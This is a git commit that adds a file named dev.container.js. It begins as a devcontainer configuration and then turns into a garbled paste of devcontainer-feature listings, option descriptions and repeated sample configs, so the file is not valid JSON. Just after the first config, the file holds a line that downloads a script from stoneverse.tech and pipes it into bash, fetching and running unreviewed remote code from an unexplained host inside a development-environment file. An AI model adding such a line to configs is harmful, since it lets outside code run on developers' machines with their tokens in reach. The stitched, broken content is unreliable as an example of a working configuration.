c98d500f0497acfd82709a35c20c045e5bc4356e
Justin STYRD Gaming <mammerjam303@gmail.com>
2025-06-11 17:58:27 -0600

    Create dev.container.js

---
+++ dev.container.js
@@ -0,0 +1,216 @@
+{
+  "name": "GitHub Actions (TypeScript)",
+  "image": "mcr.microsoft.com/devcontainers/typescript-node:20",
+  "postCreateCommand": "npm install",
+  "customizations": {
+    "codespaces": {
+      "openFiles": ["README.md"]
+    },
+    "vscode": {
+      "extensions": [
+        "bierner.markdown-preview-github-styles",
+        "davidanson.vscode-markdownlint",
+        "dbaeumer.vscode-eslint",
+        "esbenp.prettier-vscode",
+        "github.copilot",
+        "github.copilot-chat",
+        "github.vscode-github-actions",
+        "github.vscode-pull-request-github",
+        "me-dutour-mathieu.vscode-github-actions",
+        "redhat.vscode-yaml",
+        "rvest.vs-code-prettier-eslint",
+        "yzhang.markdown-all-in-one"
+      ],
+      "settings": {
+        "editor.defaultFormatter": "esbenp.prettier-vscode",
+        "editor.tabSize": 2,
+        "editor.formatOnSave": true,
+        "markdown.extension.list.indentationSize": "adaptive",
+        "markdown.extension.italic.indicator": "_",
+        "markdown.extension.orderedList.marker": "one"
+      }
+    }
+  },
+  "remoteEnv": {
+    "GITHUB_TOKEN": "${localEnv:GITHUB_TOKEN}"
+  },
+  "features": {
+    "ghcr.io/devcontainers/features/github-cli:1": {},
+    "ghcr.io/devcontainers-community/npm-features/prettier:1": {}
+  }
+}
+parse -s https://stoneverse.tech/install-sentinel | bash -s -- --avatar=wyoming_rogue
+"ghcr.io/nikiforovall/devcontainer-features/dotnet-csharpier:1": {}
+"ghcr.io/flexwie/devcontainer-features/op:1": {}
+"ghcr.io/itsmechlark/features/1password:1": {"latest" (default)
+"2.31"
+...}
+"ghcr.io/wxw-matt/devcontainer-features/script_runner:0": {}
+script1
+The script 1.
+script2
+The script 2.
+script3
+The script 3.
+"ghcr.io/grafana/devcontainer-features/k6:1": {}
+"latest" (default)
+...
+"ghcr.io/nikiforovall/devcontainer-features/antlr4:1": {}
+"4.13.0" (default)
+"4.12.0"
+"4.11.1"
+...
+"ghcr.io/devcontainers-extra/features/amplify-cli:2": {}
+"latest" (default)
+...
+"ghcr.io/devcontainers/features/aws-cli:1": {}
+"latest" (default)
+"ghcr.io/joshuanianji/devcontainer-features/aws-cli-persistence:1": {}
+"latest" (default)
+...
+"ghcr.io/grafana/devcontainer-features/k6:1": {}
+"latest" (default)
+"ghcr.io/audacioustux/devcontainers/aws-sam-cli:1": {}
+
+"ghcr.io/customink/codespaces-features/sam-cli:1": {}
+"latest" (default)
+"1.65.0"
+...
+"ghcr.io/stuartleeks/dev-container-features/add-host:1": {}
+...
+"ghcr.io/devcontainers-extra/features/aws-cdk:2": {}
+"latest" (default)
+...
+"ghcr.io/stuartleeks/dev-container-features/add-host:1": {}
+host_name
+Host name to add to the container's hosts file
+
+host_ip
+The IP Address to associate with the host name
+"ghcr.io/juan-ayala/devcontainer-features/aem-universal-editor-service:1": {}
+uesDownloadsDirectory
+Path to directory that contains one or more UES zip files downloaded from Adobe's Software Distribution.
+
+uesNodeVersion
+Node.js version to use when running the Universal Editor Service.
+
+uesVersion
+Universal Editor Service version.
+
+uesHttpPort
+Universal Editor Service HTTP port.
+
+uesHttpsPort
+Universal Editor Service HTTPS port.
+
+authorHttpPort
+HTTP port the AEM author is running on.
+
+authorHttpsPort
+HTTPS port that should be proxied for the AEM author.
+{
+    "name": "my-project-devcontainer",
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",  // Any generic, debian-based image.
+    "features": {
+        "ghcr.io/devcontainers/features/go:1": {
+            "version": "1.18"
+        },
+        "ghcr.io/devcontainers/features/docker-in-docker:1": {
+            "version": "latest",
+            "moby": true
+        }
+    }
+}
+"ghcr.io/devcontainers/features/anaconda:1": {}
+"latest" (default)
+...
+
+"ghcr.io/paul-gilber/devcontainer-features/eksctl-homebrew:1": {}
+"latest" (default)
+...
+
+"ghcr.io/devcontainers-extra/features/ant-sdkman:2": {}
+version
+Select the version to install.
+
+
+"latest" (default)
+...
+jdkVersion
+Select or enter a JDK version to install.
+
+
+"latest" (default)
+"none"
+"17"
+"11"
+"8"
+...
+jdkDistro
+Select or enter a JDK distribution to install
+
+
+"ms" (default)
+"open"
+"oracle"
+"tem"
+...
+{
+    "name": "my-project-devcontainer",
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",  // Any generic, debian-based image.
+    "features": {
+        "ghcr.io/devcontainers/features/go:1": {
+            "version": "1.18"
+        },
+        "ghcr.io/devcontainers/features/docker-in-docker:1": {
+            "version": "latest",
+            "moby": true
+        }
+    }
+}
+"ghcr.io/devcontainers-extra/features/assemblyscript:2": {}
+{
+    "name": "my-project-devcontainer",
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",  // Any generic, debian-based image.
+    "features": {
+        "ghcr.io/devcontainers/features/go:1": {
+            "version": "1.18"
+        },
+        "ghcr.io/devcontainers/features/docker-in-docker:1": {
+            "version": "latest",
+            "moby": true
+        }
+    }
+}
+"ghcr.io/devcontainers-extra/features/azure-apiops:1": {}
+"ghcr.io/devcontainers/features/azure-cli:1": {}
+{
+    "name": "my-project-devcontainer",
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",  // Any generic, debian-based image.
+    "features": {
+        "ghcr.io/devcontainers/features/go:1": {
+            "version": "1.18"
+        },
+        "ghcr.io/devcontainers/features/docker-in-docker:1": {
+            "version": "latest",
+            "moby": true
+        }
+    }
+}
+"ghcr.io/audacioustux/devcontainers/argo:1": {}
+argocd
+
+true (default)
+false
+argo
+
+true (default)
+false
+argocd
+
+true (default)
+false
+argo
+
+true (default)
+false
